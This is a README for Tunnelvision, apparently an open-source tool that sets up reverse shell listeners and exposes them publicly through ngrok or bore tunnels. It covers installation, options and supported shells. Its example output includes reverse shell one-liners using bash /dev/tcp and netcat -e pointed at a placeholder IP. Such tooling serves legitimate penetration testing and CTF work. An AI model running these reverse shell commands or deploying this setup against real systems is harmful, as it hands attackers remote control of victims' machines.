# Tunnelvision

Automate reverse shell setup using tunnel services (ngrok or bore).

## What it does

- Sets up a local listener on your chosen port
- Creates a TCP tunnel (ngrok or bore) to expose your listener publicly
- Displays ready-to-use example reverse shell commands with your public IP/port
- Automatically upgrades Linux shells for better interactivity
- Supports both Linux/Mac and Windows shells

## Installation

### Option 1: Install with uv (recommended)

```bash
# Install directly from GitHub
uv tool install git+https://github.com/Nissen96/tunnelvision

# Or clone and install locally
git clone https://github.com/Nissen96/tunnelvision.git
cd tunnelvision
uv tool install .
```

### Option 2: Install with pip

```bash
# Install directly from GitHub
pip install git+https://github.com/Nissen96/tunnelvision

# Or clone and install locally
git clone https://github.com/Nissen96/tunnelvision.git
cd tunnelvision
pip install .
```

### Option 3: Run without installing

```bash
# Clone the repository
git clone https://github.com/Nissen96/tunnelvision.git
cd tunnelvision

# Run with uv
uv run tunnelvision 4444
```

## Setup

### For bore (recommended - no setup required!)

Bore works out of the box with no authentication or setup required. Just install bore:

```bash
# Install bore (choose one method)

# Option 1: Install with cargo
cargo install bore-cli

# Option 2: Download binary from releases
# https://github.com/ekzhang/bore/releases

# Option 3: Install with package manager
# macOS: brew install bore-cli
# Arch Linux: yay -S bore
```

#### Self-hosting bore server

You can optionally run your own bore server for better control:

```bash
# Start your own bore server
bore server

# Use your server with this tool
tunnelvision 4444 --to your-server.com
```

### For ngrok

If you want to use ngrok instead of bore:

1. Install ngrok Python package:
   ```bash
   pip install ngrok
   ```

2. Sign up for an [ngrok account](https://dashboard.ngrok.com/signup) if you don't have one.
3. Get your ngrok auth token: [Your Authtoken](https://dashboard.ngrok.com/get-started/your-authtoken)
4. Set your auth token:
   ```bash
   export NGROK_AUTHTOKEN=your_token_here
   ```
   Or create a `.env` file:
   ```
   NGROK_AUTHTOKEN=your_token_here
   ```

## Usage

*Note: Replace `tunnelvision` with `uv run tunnelvision` if not installed as a tool.

```bash
# Basic usage (defaults to bore tunnel and bash shell)
tunnelvision 4444

# Use ngrok instead
tunnelvision 4444 --tunnel ngrok

# Specify shell type
tunnelvision 4444 --shell powershell
tunnelvision 4444 --tunnel bore --shell sh
tunnelvision 4444 --tunnel ngrok --shell bash

# Use custom bore server
tunnelvision 4444 --to my-bore-server.com
tunnelvision 4444 --tunnel bore --to localhost:7835

# Short options
tunnelvision 4444 -t ngrok -s powershell

# Skip printing reverse shell examples
tunnelvision 4444 --quiet
```

## Options

- **PORT**: Local port to listen on (1-65535) - positional argument
- **--tunnel, -t**: Tunnel type - 'ngrok' or 'bore' (default: bore)
- **--shell, -s**: Shell type for reverse shell examples (default: bash)
- **--to**: Remote server for bore tunnel (default: bore.pub). Only used with bore tunnel.
- **--quiet, -q**: Don't print reverse shell examples

### Supported Shells

**Linux/Unix:**
- `sh`, `bash`, `zsh`, `fish`, `dash`, `ash`, `ksh`, `csh`, `tcsh`, `mksh`, `pdksh`

**Windows:**
- `powershell`, `pwsh`, `cmd`

**Note:** You can specify any shell name - the tool will generate appropriate reverse shell examples for the specified shell.
However, the shell will not be attempted upgraded if it is unknown.

## Example Output

```
[+] Setting up bore tunnel...
[+] Listening at 1.2.3.4:12345 (bore.pub)...

=============== REVSHELL EXAMPLES ===============

Bash:
────────────────────────────────────────────
bash -i >& /dev/tcp/1.2.3.4/12345 0>&1
────────────────────────────────────────────

Netcat:
────────────────────────────────────────────
nc 1.2.3.4 12345 -e bash
ncat 1.2.3.4 12345 -e bash
────────────────────────────────────────────

[+] Waiting for connection...
    Press Ctrl+C to exit
```

## Features

- **Multiple tunnel options**: Choose between bore or ngrok
- **Automatic shell upgrade**: Linux shells get PTY upgrades, aliases, and proper terminal settings
- **Multiple examples**: Bash, Netcat, Python, Perl, Ruby, and PowerShell reverse shells
- **Clean exit**: Automatically closes tunnels when you exit
- **Cross-platform**: Works on Linux, macOS, and Windows

## Requirements

- Python 3.9+
- bore (required for bore tunnels)
- ngrok Python package (optional, only needed for ngrok tunnels)
- `uv` package manager (recommended) or `pip`

## License

MIT
